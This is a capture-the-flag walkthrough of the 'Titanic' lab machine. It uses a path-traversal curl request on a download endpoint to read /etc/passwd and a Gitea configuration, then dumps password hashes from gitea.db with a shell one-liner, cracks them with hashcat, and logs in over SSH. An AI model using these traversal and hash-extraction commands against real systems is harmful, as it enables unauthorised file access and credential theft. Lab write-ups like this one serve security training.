---
title: TITANIC
description: walkthrough
---

![image.png](../../../assets/TITANIC/image.png)

Titanic is easy linux machine. 

### Reconnaissance

Nmap

![image.png](../../../assets/TITANIC/image%201.png)

![image.png](../../../assets/TITANIC/image%202.png)

Two ports are open port 22 ssh and port 80 http

the ip is redirected to [http://titanic.htb](http://titanic.htb) I add the domain to /etc/hosts file

![image.png](../../../assets/TITANIC/image%203.png)

![image.png](../../../assets/TITANIC/image%204.png)

![image.png](../../../assets/TITANIC/image%205.png)

version and application use for the website

![image.png](../../../assets/TITANIC/image%206.png)

two hidden directories found

![image.png](../../../assets/TITANIC/image%207.png)

![image.png](../../../assets/TITANIC/image%208.png)

there is noting 

![image.png](../../../assets/TITANIC/image%209.png)

![image.png](../../../assets/TITANIC/image%2010.png)

![image.png](../../../assets/TITANIC/image%2011.png)

![image.png](../../../assets/TITANIC/image%2012.png)

I ask ai to analyze the nikto scan and above image are the result I got 

some of them make sense but not all of them 

checking the functionalities of the main page of titanic 

![image.png](../../../assets/TITANIC/image%2013.png)

submit the details

![image.png](../../../assets/TITANIC/image%2014.png)

there is program running in the background when I submit the detail

a request to download file 

![image.png](../../../assets/TITANIC/image%2015.png)

I nearly forgot the important step to perform which is subdomain enumeration

![image.png](../../../assets/TITANIC/image%2016.png)

![image.png](../../../assets/TITANIC/image%2017.png)

there is a subdomain called “dev”

![image.png](../../../assets/TITANIC/image%2018.png)

on the background I run the command to find the hidden directories 

![image.png](../../../assets/TITANIC/image%2019.png)

![image.png](../../../assets/TITANIC/image%2020.png)

when I was just checking the functionality of the website I got this code 

![image.png](../../../assets/TITANIC/image%2021.png)

![image.png](../../../assets/TITANIC/image%2022.png)

I really need to try this 

```bash
curl -X GET "http://titanic.htb/download?ticket=../../../../etc/passwd"
```

![image.png](../../../assets/TITANIC/image%2023.png)

![image.png](../../../assets/TITANIC/image%2024.png)

from the above information:

- a normal user “developer”
- user developer has a home directory(/home/developer) and a **bash shell**
- there is another user called “_laurel” and no login shell

[Installation with Docker | Gitea Documentation](https://docs.gitea.com/installation/install-with-docker)

gitea.com

![image.png](../../../assets/TITANIC/image%2025.png)

**point to remember:**

- the directory name will be gitea before installing gitea

**Now what’s next?**

### Enumeration

- there is download endpoint which sends request to serve and we can take advantage of it
- we found out the user “developer”
- the developer is using gitea

bringing the info together 

![image.png](../../../assets/TITANIC/image%2026.png)

![image.png](../../../assets/TITANIC/cf9dc68e-fdcc-4a03-9550-7217cf5407f8.png)

we know that there is a user “developer” and those endpoint can be used by the developer 

we can take advantage of download endpoint to get this file

```bash
curl --path-as-is http://titanic.htb/download?ticket=../../home/developer/gitea/
data/gitea/conf/app.ini
```

![image.png](../../../assets/TITANIC/image%2027.png)

![image.png](../../../assets/TITANIC/image%2028.png)

this subdomain gives nothing, just the main page of titanic

![image.png](../../../assets/TITANIC/image%2029.png)

there is another file called “gitea.db” 

lets download it

![image.png](../../../assets/TITANIC/image%2030.png)

**what I can do with this file?**

![image.png](../../../assets/TITANIC/image%2031.png)

![image.png](../../../assets/TITANIC/image%2032.png)

![image.png](../../../assets/TITANIC/image%2033.png)

![image.png](../../../assets/TITANIC/image%2034.png)

how to extract hash from gitea.db

[HTB: Compiled](https://0xdf.gitlab.io/2024/12/14/htb-compiled.html)

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; 
do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64);
 salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64);
  name=$(echo $data | cut -d'|' -f 3); 
  echo "${name}:sha256:50000:${salt}:${digest}"; done | te
```

![image.png](../../../assets/TITANIC/image%2035.png)

to crack the hash it is in the above blog

```bash
hashcat gitea.hashes rockyou.txt --user 
```

![image.png](../../../assets/TITANIC/image%2036.png)

![developer’s password](../../../assets/TITANIC/image%2037.png)

developer’s password

got the user “developer” password. there is we found ssh port 22 open in the nmap scan

ssh login 

![ssh login](../../../assets/TITANIC/image%2038.png)

ssh login

![login as developer](../../../assets/TITANIC/image%2039.png)

login as developer

### Lateral Movement

![image.png](../../../assets/TITANIC/image%2040.png)

![image.png](../../../assets/TITANIC/image%2041.png)

![image.png](../../../assets/TITANIC/image%2042.png)

When I was just seeing around the directories I just got the root flag

![Machine Pwned!](../../../assets/TITANIC/image%2043.png)

Machine Pwned!